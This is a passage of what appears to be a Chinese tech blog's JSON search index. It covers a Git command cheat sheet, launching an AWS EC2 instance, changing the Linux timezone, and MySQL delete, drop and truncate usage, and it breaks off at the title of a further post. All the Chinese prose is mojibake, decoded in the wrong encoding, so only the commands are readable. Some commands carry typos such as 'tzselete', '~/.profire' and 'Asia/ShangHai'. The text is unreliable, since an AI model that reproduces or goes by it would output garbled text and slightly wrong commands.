æäº¤å¹¶æ˜¾ç¤ºdiffå˜åŒ–git commit -v# é‡å†™ä¸Šä¸€æ¬¡çš„æäº¤# å¦‚æœä»£ç æ²¡æœ‰ä»»ä½•æ–°å˜åŒ–ï¼Œåˆ™ç”¨æ¥æ”¹å†™ä¸Šä¸€æ¬¡commitçš„æäº¤ä¿¡æ¯$ git commit --amend -m [message] æ—¥å¿—1234567891011121314151617181920# æŸ¥çœ‹å®Œæ•´å†å²æäº¤è®°å½•$ git log# æŸ¥çœ‹å‰n æ¡è®°å½•$ git log -n# ä»¥å›¾å½¢æ–¹å¼æŸ¥çœ‹å®Œæ•´å†å²æäº¤è®°å½•$ git log --graph --pretty&#x3D;oneline --abbrev-commit# é€šè¿‡commit log è¿›è¡Œæœç´¢$ git log -i --grep&#x3D;&quot;fire bug&quot;# åˆ—å‡ºæäº¤è€…è´¡çŒ®æ•°é‡, åªä¼šæ‰“å°ä½œè€…å’Œè´¡çŒ®æ•°é‡$ git shortlog -sn# ä»¥æäº¤è´¡çŒ®æ•°é‡æ’åºå¹¶æ‰“å°å‡ºä¿¡æ¯$ git shortlog -n# é‡‡ç”¨é‚®ç®±æ ¼å¼åŒ–çš„æ–¹å¼è¿›è¡ŒæŸ¥çœ‹è´¡çŒ®åº¦$ git shortlog -e åˆ†æ”¯123456789101112131415161718192021222324252627282930313233343536373839404142434445# æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯git branch# æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯git branch -a# æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯æ‰€å…³è”çš„è¿œç¨‹åˆ†æ”¯git branch -vv# æŸ¥çœ‹æœ¬åœ° master åˆ†æ”¯åˆ›å»ºæ—¶é—´git reflog show --date&#x3D;iso master# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä½†ä¾ç„¶åœç•™åœ¨å½“å‰åˆ†æ”¯$ git branch [branch-name]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯$ git checkout -b [branch]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŒ‡å®šcommit$ git branch [branch] [commit-id]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯å»ºç«‹è¿½è¸ªå…³ç³»$ git branch --track [branch] [remote-branch]# åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ï¼Œå¹¶æ›´æ–°å·¥ä½œåŒº$ git checkout [branch-name]# å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œåœ¨ç°æœ‰åˆ†æ”¯ä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯ä¹‹é—´$ git branch --set-upstream [branch] [remote-branch]# åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯$ git merge [branch]# é€‰æ‹©ä¸€ä¸ªcommitï¼Œåˆå¹¶è¿›å½“å‰åˆ†æ”¯$ git cherry-pick [commit-id]# åˆ é™¤æŒ‡å®šåˆ†æ”¯$ git branch -d [branch-name]# å¼ºåˆ¶åˆ é™¤æŒ‡å®šåˆ†æ”¯$ git branch -D [branch-name]# åˆ é™¤è¿œç¨‹åˆ†æ”¯$ git push origin --delete [branch-name]$ git branch -dr [remote&#x2F;branch] è¿œç¨‹ä»“åº“ç®¡ç†1234567891011121314151617181920# æŸ¥çœ‹è¿œç¨‹ä»“åº“ï¼ˆé»˜è®¤æ˜¯originï¼Œè¿™æ˜¯git ä¼šä½¿ç”¨çš„é»˜è®¤åç§°ï¼‰$ git remote # æŒ‡å®š-v, æŸ¥çœ‹æ‰€æœ‰è¿œç¨‹ä»“åº“åœ°å€$ git remote -v# æ·»åŠ ä¸€ä¸ªæ–°çš„è¿œç¨‹ä»“åº“$ git remote add [origin-name] https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git# æŸ¥çœ‹æŒ‡å®šè¿œç¨‹ä»“åº“çš„è¯¦æƒ…ä¿¡æ¯$ git remote show [origin-name]# é‡å‘½åè¿œç¨‹ä»“åº“$ git remote rename [old-name] [new-name]# ç§»é™¤è¿œç¨‹ä»“åº“$ git remote remove [origin-name]# ä¿®æ”¹æº$ git remote set-url origin [NEW_URL] Push1234567891011# é»˜è®¤æ¨é€å½“å‰åˆ†æ”¯$ git push# æ¨é€å†…å®¹åˆ°ä¸»åˆ†æ”¯ï¼Œå¹¶å»ºç«‹è¿½è¸ªå…³ç³»$ git push -u origin master# å°†æœ¬åœ°åˆ†æ”¯æ¨é€åˆ°æŒ‡å®šè¿œç¨‹åˆ†æ”¯ï¼Œ ï¼ˆæœ¬åœ°åˆ†æ”¯:è¿œç¨‹åˆ†æ”¯ï¼‰$ git push origin [branch]:[branch]# å¼ºè¡Œæ¨é€å½“å‰åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“ï¼Œå³ä½¿æœ‰å†²çª$ git push -f Pull1234567891011# å–å›é»˜è®¤è¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶è‡ªåŠ¨ä¸æœ¬åœ°åˆ†æ”¯åˆå¹¶$ git pull# å–å›æŒ‡å®šè¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶è‡ªåŠ¨ä¸æœ¬åœ°æŒ‡å®šåˆ†æ”¯åˆå¹¶ï¼ˆè¿œç¨‹åˆ†æ”¯å:æœ¬åœ°åˆ†æ”¯åï¼‰$ git pull [remote] [branch]:[branch]# å–å›æŒ‡å®šè¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶è‡ªåŠ¨ä¸æœ¬åœ°å½“å‰åˆ†æ”¯åˆå¹¶$ git pull origin master# å–å›è¿œç¨‹ä»“åº“çš„æ‰€æœ‰å˜åŠ¨ï¼Œä½†æ˜¯ä¸ä¼šè‡ªåŠ¨ä¸æœ¬åœ°å½“å‰åˆ†æ”¯åˆå¹¶$ git fetch è¿›é˜¶æ“ä½œè¿›é˜¶æ“ä½œä¸­çš„å‘½ä»¤æ˜¯ä¸€äº›å¾ˆå®ç”¨ï¼Œä½†å¯èƒ½ä¸å¸¸ä½¿ç”¨ï¼Œæ‰€ä»¥æŠŠå®ƒä»¬å•ç‹¬æ‹å‡ºæ¥ã€‚ cherry-pick12345# é€‰æ‹©ä¸€ä¸ªcommitï¼Œåˆå¹¶è¿›å½“å‰åˆ†æ”¯$ git cherry-pick [commit-id]# ä¿ç•™åŸæœ‰ä½œè€…ä¿¡æ¯è¿›è¡Œæäº¤$ git cherry-pick -x [commit-id] Stash1234567891011# å°†å½“å‰çš„å·¥ä½œåŒºéšè—$ git stash# æ¢å¤éšè—çš„å·¥ä½œåŒºï¼Œå¹¶å°†æ­¤æ¬¡éšè—è®°å½•ä»éšè—åˆ—è¡¨ä¸­ç§»å‡º$ git stash pop# æ¢å¤éšè—çš„å·¥ä½œåŒºï¼Œä¿ç•™æ­¤æ¬¡éšè—è®°å½•$ git stash apply# æŸ¥çœ‹å½“å‰éšè—åˆ—è¡¨$ git stash list Blamegit blame ç”¨äºæŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹å†å²è®°å½•æ˜¯å“ªä¸ªä½œè€…è¿›è¡Œäº†æ”¹åŠ¨ã€‚ 12345678# æŸ¥çœ‹ README.md æ–‡ä»¶çš„ä¿®æ”¹å†å²è®°å½•ï¼ŒåŒ…æ‹¬æ—¶é—´ã€ä½œè€…ä»¥åŠå†…å®¹$ git blame README.md# æŸ¥çœ‹è°æ”¹åŠ¨äº† README.md æ–‡ä»¶çš„ 11è¡Œ-12è¡Œ$ git blame -L 11,12 README.md# æŸ¥çœ‹è°æ”¹åŠ¨äº† README.md æ–‡ä»¶11è¡Œä»¥å$ git blame -L 11 README.md æ ‡ç­¾1234567891011121314151617181920212223242526272829303132# åˆ—å‡ºæœ¬åœ°æ‰€æœ‰æ ‡ç­¾git tag# æ–°å»ºä¸€ä¸ªtagåœ¨å½“å‰commit$ git tag [tag]# æ–°å»ºä¸€ä¸ªtagåœ¨æŒ‡å®šcommit$ git tag [tag] [commit]# åˆ é™¤æœ¬åœ°tag$ git tag -d [tag]# åˆ é™¤è¿œç¨‹tag$ git push origin :refs&#x2F;tags&#x2F;[tagName]# åˆ—å‡ºè¿œç¨‹æ‰€æœ‰æ ‡ç­¾$ git ls-remote --tags origin# åˆ›å»ºå¸¦æœ‰é™„æ³¨æ ‡ç­¾$ git tag -a v1.1.0 -m &quot;æ ‡ç­¾æè¿°&quot;# æŸ¥çœ‹æœ¬åœ°tagä¿¡æ¯$ git show [tag]# æäº¤æŒ‡å®štag$ git push [remote] [tag]# æäº¤æ‰€æœ‰tag$ git push [remote] --tags# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŸä¸ªtag$ git checkout -b [branch] [tag] Git ProTipsGit ProTips åˆ™æ˜¯æ•´ç†çš„ä¸€äº›Git çš„å¥‡æŠ€æ·«å·§ã€‚ 12345678910# é€šè¿‡ä½¿ç”¨åˆ«åï¼Œä¼˜åŒ– git log è¾“å‡ºï¼Œè¿™é‡Œå¦å¤–æä¾›å‡ ç§æ¨¡å¼, å¯ä»¥é€‰æ‹©å–œæ¬¢çš„ä¸€ç§è¿›è¡Œåˆ«åé…ç½®$ git config --global alias.lg &quot;log --graph --pretty&#x3D;format:&#39;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#39; --abbrev-commit --date&#x3D;relative&quot;$ git config --global alias.his &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.hist &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;$ git config --global alias.lg &quot;log --pretty&#x3D;format:&#39;%h - %an, %ar : %s&#39; &quot; å‚è€ƒé“¾æ¥ Git å¸¸ç”¨å‘½ä»¤æ•´ç† å¸¸ç”¨Git å‘½ä»¤æ¸…å•","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•åˆ›å»ºå¯åŠ¨ AWS å®ä¾‹","slug":"teach-you-how-to-start-an-aws-instance","date":"2020-08-10T06:05:17.000Z","updated":"2020-08-27T06:26:53.546Z","comments":true,"path":"teach-you-how-to-start-an-aws-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/","excerpt":"ä»€ä¹ˆæ˜¯AWS ï¼Ÿ Amazon Web Services (AWS) æ˜¯äºšé©¬é€Šæä¾›çš„å…¨çƒæœ€å…¨é¢ã€åº”ç”¨æœ€å¹¿æ³›çš„äº‘å¹³å°ã€‚","text":"ä»€ä¹ˆæ˜¯AWS ï¼Ÿ Amazon Web Services (AWS) æ˜¯äºšé©¬é€Šæä¾›çš„å…¨çƒæœ€å…¨é¢ã€åº”ç”¨æœ€å¹¿æ³›çš„äº‘å¹³å°ã€‚ äº‘è¿™ä¸ªæ¦‚å¿µæœ€å¼€å§‹æ˜¯ä»å›½å†…çš„é˜¿é‡Œäº‘ã€è…¾è®¯äº‘è¿™äº›åœ°æ–¹å¬åˆ°çš„ï¼Œåæ¥æœåŠ¡å™¨æ¥è§¦çš„å¤šäº†ï¼Œä¹Ÿæ…¢æ…¢äº†è§£äº†ä¸€äº›å›½å¤–çš„äº‘ï¼Œå¦‚ï¼šäºšé©¬é€Šäº‘ã€å¾®è½¯äº‘ã€‚ åœ¨äºšé©¬é€Šäº‘ã€è½¯å¾®äº‘ä¸Šåˆ›å»ºä¸€å°å®ä¾‹å…¶å®æ˜¯éå¸¸ç®€å•çš„äº‹æƒ…ï¼Œä½†ç”±äºè¿™æ–¹é¢èµ„æ–™æ¯”è¾ƒå°‘ï¼Œå¯¼è‡´å¯¹äºæ–°ç”¨æˆ·å¯èƒ½ä¸é‚£ä¹ˆå‹å¥½ï¼Œæˆ‘è‡ªå·±å½“åˆåˆ›å»ºæ—¶å°±ä¸æ€ä¹ˆé¡ºåˆ©ã€‚æ‰€ä»¥æ•´ç†è¿™ç¯‡ç¬”è®°çš„ç›®çš„æœ‰ä¸¤ä¸ªï¼Œä¸€æ˜¯æ–¹ä¾¿è‡ªå·±æ—¥åå›é¡¾ï¼ŒäºŒæ˜¯ç»™ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„ç”¨æˆ·ä¸€äº›å‚è€ƒã€‚ å¯åŠ¨å®ä¾‹é¦–å…ˆç™»å…¥åˆ°AWS ï¼Œæ‰¾åˆ°EC2 å¹¶ç‚¹å‡» åœ¨å·¦ä¾§èœå•æ ä¸­ç‚¹å‡»å®ä¾‹ ç‚¹å‡»å¯åŠ¨å®ä¾‹ é…ç½®å®ä¾‹é€‰æ‹©ç³»ç»Ÿæ˜ åƒï¼Œè¿™é‡Œä»¥Linux æ“ä½œç³»ç»Ÿä¸ºä¾‹ï¼Œæˆ‘é€‰æ‹©æ˜¯Ubuntu Server 18.04 LTSï¼Œè¿™ä¸ªç‰ˆæœ¬è¡¨ç¤ºUbuntu æœåŠ¡ç«¯ é•¿æœŸç¨³å®šæ”¯æŒç‰ˆæœ¬ã€‚ é€‰æ‹©å®ä¾‹ç±»å‹ï¼Œæ ¹æ®è‡ªèº«éœ€è¦è€ƒè™‘ï¼Œå½“ç„¶ æ€§èƒ½è¶Šå¥½ä»·æ ¼è¶Šé«˜ã€‚è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ä¸€ä¸ªä¸­ç­‰åä¸‹çš„ç±»å‹ã€‚ é…ç½®å®ä¾‹è¯¦æƒ…ä¿¡æ¯ï¼Œè¿™é‡Œçš„è¿™äº›æ ¸å¿ƒé…ç½®ï¼Œé€šå¸¸éƒ½ä¿æŒé»˜è®¤ï¼Œåªæ˜¯å°†è‡ªåŠ¨åˆ†é…å…¬æœ‰IP åœ°å€æ”¹ä¸ºç¦ç”¨ã€‚è¿™æ ·å†é‡å¯æœºå™¨æ—¶ï¼Œå°±ä¸ä¼šæ”¹å˜IPäº†ã€‚ æ ¹æ®è‡ªèº«éœ€è¦åˆ†é…åˆé€‚çš„ç¡¬ç›˜å¤§å°ã€‚ é…ç½®å®‰å…¨ç»„ï¼Œæ‰€è°“å®‰å…¨ç»„å°±æ˜¯æ‹¥æœ‰ç›¸åŒé˜²ç«å¢™è§„åˆ™çš„ç¾¤ç»„ã€‚è¿™ä¸ªä¹Ÿæ˜¯æ ¹æ®è‡ªèº«éœ€è¦é€‰æ‹©æ˜¯å¦å…±ç”¨åŒä¸€ä¸ªå®‰å…¨ç»„ã€‚ æ‹¥æœ‰åŒä¸€ä¸ªå®‰å…¨ç»„å°±è¡¨ç¤ºæ‹¥æœ‰ç›¸åŒçš„é˜²ç«å¢™è§„åˆ™ã€‚è®¾ç½®å®Œå®‰å…¨ç»„ä¹‹åï¼Œç‚¹å‡»å®¡æ ¸å’Œå¯åŠ¨ã€‚ ä¸‹é¢ä¼šæœ‰ä¸€ä¸ªç•Œé¢ç»™ä½ ç¡®è®¤æœºå™¨çš„é…ç½®æ˜¯å¦æ— è¯¯çš„ï¼Œä»å¤´åˆ°å°¾æ£€æŸ¥æ²¡æœ‰é—®é¢˜ä¹‹åå°±å¯ä»¥ç‚¹å‡»å¯åŠ¨å®ä¾‹äº†ã€‚ åˆ›å»ºå¯†é’¥å¯ä»¥é€‰æ‹©å…±ç”¨å·²æœ‰çš„å¯†é’¥å¯¹ä¹Ÿå¯ä»¥é€‰æ‹©æ–°å»ºä¸€ä¸ªã€‚ ç„¶åç‚¹å‡»å¯åŠ¨å®ä¾‹ã€‚ åˆ†é…å¼¹æ€§IPå¯åŠ¨å®Œæˆä¹‹åç‚¹å‡»æŸ¥çœ‹å®ä¾‹ã€‚ åœ¨å®ä¾‹åˆ—è¡¨ä¸­ï¼Œæ‰¾åˆ°è¯¥å®ä¾‹ä¹‹åï¼Œåˆ†åˆ«ç‚¹å‡»æ“ä½œ=&gt;è”ç½‘=&gt;ç®¡ç†IP åœ°å€=&gt;åˆ†é…å¼¹æ€§ IP ç¡®è®¤åˆ†é… åˆ†é…æˆåŠŸä¹‹åï¼Œä¼šå¾—åˆ°ä¸€ä¸ªå¼¹æ€§IPï¼ˆå…¬æœ‰ï¼‰ï¼Œç„¶åè¿”å›å®ä¾‹åˆ—è¡¨ å…³è”IP åœ°å€æ‰¾åˆ°åˆšæ‰å¯åŠ¨çš„é‚£ä¸ªå®ä¾‹ï¼ˆæ²¡æœ‰å®ä¾‹IDï¼‰ï¼Œåˆ†åˆ«ç‚¹å‡»æ“ä½œ=&gt;å…³è”åœ°å€ è¿™ä¸€æ­¥å¾ˆé‡è¦ï¼Œè¿™é‡Œè¦å°†å®ä¾‹å’Œå¼¹æ€§IP åœ°å€å…³è”ï¼Œæ‰€ä»¥è¦é€‰æ‹©è¯¥å¼¹æ€§IP å¯¹åº”è‡ªå·±çš„å®ä¾‹ã€‚å¦‚æœä¸ç¡®å®šæ˜¯å“ªä¸€ä¸ªï¼Œå¯ä»¥è¿”å›åˆ°å®ä¾‹åˆ—è¡¨ä¸­å»æŸ¥çœ‹ï¼Œå°±æ˜¯é‚£ä¸ªæ²¡æœ‰åç§°çš„å®ä¾‹ã€‚ ç„¶åç‚¹å‡»å…³è” å…³è”æˆåŠŸ ç›´åˆ°åšå®Œè¿™ä¸€æ­¥æ‰ç®—æ­£çœŸçš„å¯åŠ¨å¥½ä¸€ä¸ªå®ä¾‹ã€‚ è¿æ¥å¯åŠ¨å¥½å®ä¾‹ä¹‹åï¼Œå¦‚ä½•è¿æ¥å‘¢ï¼Ÿ 1$ ssh -i &lt;ç§é’¥è·¯å¾„&gt; ubuntu@ipaddress æŒ‡å®šåˆšæ‰ç”Ÿæˆçš„å¯†é’¥å¯¹ï¼Œä½¿ç”¨sshå‘½ä»¤ å³å¯è¿æ¥ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"äº‘","slug":"äº‘","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"å¦‚ä½•ä¿®æ”¹ Linux é»˜è®¤æ—¶åŒº","slug":"how-to-modify-the-linux-default-time-zone","date":"2020-08-09T13:23:30.000Z","updated":"2020-08-22T00:44:06.247Z","comments":true,"path":"how-to-modify-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/","excerpt":"åœ¨ä¸Šä¸€ç¯‡ç¬”è®°ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¦‚ä½•åœ¨Linux ä¸­æŸ¥çœ‹ç³»ç»Ÿé»˜è®¤æ—¶åŒºï¼Œè¿™ç¯‡ç¬”è®°æ¥å­¦ä¹ ä»¥ä¸‹å¦‚ä½•ä¿®æ”¹é»˜è®¤æ—¶åŒºã€‚","text":"åœ¨ä¸Šä¸€ç¯‡ç¬”è®°ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¦‚ä½•åœ¨Linux ä¸­æŸ¥çœ‹ç³»ç»Ÿé»˜è®¤æ—¶åŒºï¼Œè¿™ç¯‡ç¬”è®°æ¥å­¦ä¹ ä»¥ä¸‹å¦‚ä½•ä¿®æ”¹é»˜è®¤æ—¶åŒºã€‚ åœ¨Linux æœåŠ¡å™¨æˆ–ç³»ç»Ÿä¸Šä¿æŒæ­£ç¡®çš„æ—¶é—´å§‹ç»ˆæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå®ƒå¯èƒ½å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š ç”±äºLinux ä¸­çš„å¤§å¤šæ•°ä»»åŠ¡éƒ½æ˜¯æŒ‰æ—¶é—´æ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥ä¿æŒç³»ç»Ÿä»»åŠ¡çš„åŠæ—¶è¿è¡Œã€‚ åœ¨ç³»ç»Ÿä¸Šè®°å½•äº‹ä»¶å’Œå…¶ä»–ä¿¡æ¯çš„æ­£ç¡®æ—¶é—´ç­‰ç­‰ã€‚ åœ¨Linux ä¸­è®¾ç½®æ—¶åŒºï¼Œæœ‰å‡ ç§æ–¹å¼ã€‚ 0x1. ä½¿ç”¨tzselete å‘½ä»¤ ä½¿ç”¨tzselete å‘½ä»¤é€‰æ‹©æ‰€åœ¨æ—¶åŒºã€‚ å°†æ—¶åŒºæ‰€åœ¨çš„é…ç½®æ–‡ä»¶TZ=&#39;Asia/Shanghai&#39;; export TZ æ·»åŠ åˆ°~/.profileæ–‡ä»¶ã€‚ ä½¿ç”¨source ~/.profireå‘½ä»¤ï¼Œä½¿æ—¶åŒºè®¾ç½®ç”Ÿæ•ˆã€‚ 0x2. ä½¿ç”¨timedatectl å‘½ä»¤Ubuntu ç³»ç»Ÿæä¾›äº†timedatectl å‘½ä»¤ï¼Œéå¸¸æ–¹ä¾¿çš„ä¾›æˆ‘ä»¬æŸ¥çœ‹è®¾ç½®Linux ç³»ç»Ÿæ—¶åŒºã€‚ 1$ timedatectl set-timezone &quot;Asia&#x2F;ShangHai&quot; å¦‚æœä½ å¿˜è®°äº†ä½ æƒ³è¦çš„æ—¶åŒºå«ä»€ä¹ˆåå­—ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰å¯ç”¨æ—¶åŒºï¼š 1$ timedatectl list-timezones å› ä¸º Linux çš„æ—¶é—´åˆ†ä¸ºä¸¤ç§ï¼š ç¡¬ä»¶æ—¶é—´ï¼šç”± BIOSï¼ˆæˆ–CMOSï¼‰æ‰€è´Ÿè´£ã€‚ ç³»ç»Ÿæ—¶é—´ï¼šç”± Linux æ‰€è´Ÿè´£ï¼Œç³»ç»Ÿæ—¶é—´åœ¨ç³»ç»Ÿå¼€å…³æœºåè¯»å–ç¡¬ä»¶æ—¶é—´åï¼Œå†ç”± Linux ç®¡ç†æ—¶é—´ã€‚ 0x3. è®¾ç½®ç¡¬ä»¶æ—¶é—´12$ cd &#x2F;etc&#x2F; &amp;&amp; ls -al | grep localtimelrwxrwxrwx 1 root root 27 Jul 24 00:57 localtime -&gt; &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Etc&#x2F;UTC å¯ä»¥çœ‹åˆ°é»˜è®¤é“¾æ¥çš„æ˜¯UTCï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨æ›´æ”¹é“¾æ¥æ—¶åŒºæ–‡ä»¶ã€‚ 1$ ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime æŸ¥çœ‹ç¡¬ä»¶æ—¶é—´ 1$ hwclock -r å°†ç³»ç»Ÿæ—¶é—´æ”¹ä¸ºç¡¬ä»¶æ—¶é—´ 1$ hwclock --hctosys éœ€è¦æƒ³æ¸…æ¥šçš„æ˜¯ï¼Œæ—¶é—´æˆ³æœ¬èº«æ˜¯æ°¸è¿œä¸å˜çš„ï¼Œæ— è®ºåœ¨å“ªä¸ªæ—¶åŒºåŒä¸€æ—¶åˆ»æ‰€ç”Ÿæˆçš„æ—¶é—´æˆ³ä¸€å®šæ˜¯ä¸€æ ·çš„ã€‚ ä¼šå‘ç”Ÿå˜åŒ–çš„åªæœ‰æ—¶åŒºï¼Œè€Œæ—¶é—´æˆ³åˆ™æ˜¯æ ¹æ®æ—¶åŒºçš„ä¸åŒè€Œè§£æå‡ºæ¥çš„æ—¶é—´ä¸åŒã€‚ å‚è€ƒé“¾æ¥ How to Set Time, Timezone and Synchronize System Clock Using timedatectl Command Linux æŸ¥çœ‹è®¾ç½®ç³»ç»Ÿæ—¶åŒº Linux æ—¶é—´ä»¥åŠæ—¶åŒº","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql åˆ é™¤æ•°æ®åŠæ•°æ®è¡¨","slug":"mysql-delete-data-and-data-table","date":"2020-08-06T14:36:46.000Z","updated":"2020-09-20T15:39:21.488Z","comments":true,"path":"mysql-delete-data-and-data-table/","link":"","permalink":"https://www.0x2beace.com/mysql-delete-data-and-data-table/","excerpt":"åœ¨Mysql ä¸­åˆ é™¤æ•°æ®ä»¥åŠæ•°æ®è¡¨éå¸¸çš„å®¹æ˜“ï¼Œä½†æ˜¯éœ€è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºä¸€æ—¦åˆ é™¤æ‰€æœ‰æ•°æ®éƒ½ä¼šæ¶ˆå¤±ã€‚","text":"åœ¨Mysql ä¸­åˆ é™¤æ•°æ®ä»¥åŠæ•°æ®è¡¨éå¸¸çš„å®¹æ˜“ï¼Œä½†æ˜¯éœ€è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºä¸€æ—¦åˆ é™¤æ‰€æœ‰æ•°æ®éƒ½ä¼šæ¶ˆå¤±ã€‚ åˆ é™¤æ•°æ®åˆ é™¤è¡¨å†…æ•°æ®ï¼Œä½¿ç”¨deleteå…³é”®å­—ã€‚ åˆ é™¤æŒ‡å®šæ¡ä»¶çš„æ•°æ®åˆ é™¤ç”¨æˆ·è¡¨å†…id ä¸º1 çš„ç”¨æˆ·ï¼š 1delete from User where id &#x3D; 1; åˆ é™¤è¡¨å†…æ‰€æœ‰æ•°æ®åˆ é™¤è¡¨ä¸­çš„å…¨éƒ¨æ•°æ®ï¼Œè¡¨ç»“æ„ä¸å˜ã€‚ å¯¹äº MyISAM ä¼šç«‹åˆ»é‡Šæ”¾ç£ç›˜ç©ºé—´ï¼ŒInnoDB ä¸ä¼šé‡Šæ”¾ç£ç›˜ç©ºé—´ã€‚ 1delete from User; é‡Šæ”¾ç£ç›˜ç©ºé—´ 1optimize table User; åˆ é™¤æ•°æ®è¡¨åˆ é™¤æ•°æ®è¡¨åˆ†ä¸ºä¸¤ç§æ–¹å¼ï¼š åˆ é™¤æ•°æ®è¡¨å†…æ•°æ®ä»¥åŠè¡¨ç»“æ„ åªåˆ é™¤è¡¨å†…æ•°æ®ï¼Œä¿ç•™è¡¨ç»“æ„ dropä½¿ç”¨dropå…³é”®è¯ä¼šåˆ é™¤æ•´å¼ è¡¨ï¼Œå•¥éƒ½æ²¡æœ‰äº†ã€‚ 1drop table User; truncatetruncate å…³é”®å­—åˆ™åªåˆ é™¤è¡¨å†…æ•°æ®ï¼Œä¼šä¿ç•™è¡¨ç»“æ„ã€‚ 1truncate table User; æ€è€ƒé¢˜ï¼šå¦‚ä½•æ‰¹é‡åˆ é™¤å‰ç¼€ç›¸åŒçš„è¡¨ï¼Ÿ æƒ³è¦å®ç° drop table like &#39;wp_%&#39;ï¼Œæ²¡æœ‰ç›´æ¥å¯ç”¨çš„å‘½ä»¤ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡Mysql çš„è¯­æ³•æ¥æ‹¼æ¥ã€‚ 1234-- åˆ é™¤â€wp_â€å¼€å¤´çš„è¡¨ï¼šSELECT CONCAT( &#39;drop table &#39;, table_name, &#39;;&#39; ) AS statementFROM information_schema.tablesWHERE table_schema &#x3D; &#39;database_name&#39; AND table_name LIKE &#39;wp_%&#39;; å…¶ä¸­database_nameæ¢æˆæ•°æ®åº“çš„åç§°ï¼Œwp_æ¢æˆéœ€è¦æ‰¹é‡åˆ é™¤çš„è¡¨å‰ç¼€ã€‚ æ³¨æ„åªæœ‰dropå‘½ä»¤æ‰èƒ½è¿™æ ·ç”¨ï¼š 1drop table if exists tablename&#96;; truncateåªèƒ½è¿™æ ·ä½¿ç”¨ï¼š 1truncate table &#96;tp_trade&#96;.&#96;setids&#96;; æ€»ç»“ å½“ä½ ä¸å†éœ€è¦è¯¥è¡¨æ—¶ï¼Œ ç”¨drop; å½“ä½ ä»è¦ä¿ç•™è¯¥è¡¨ï¼Œä½†è¦åˆ é™¤æ‰€æœ‰è®°å½•æ—¶ï¼Œ ç”¨truncate; å½“ä½ è¦åˆ é™¤éƒ¨åˆ†è®°å½•æ—¶ï¼Œ ç”¨deleteã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Git Push -f 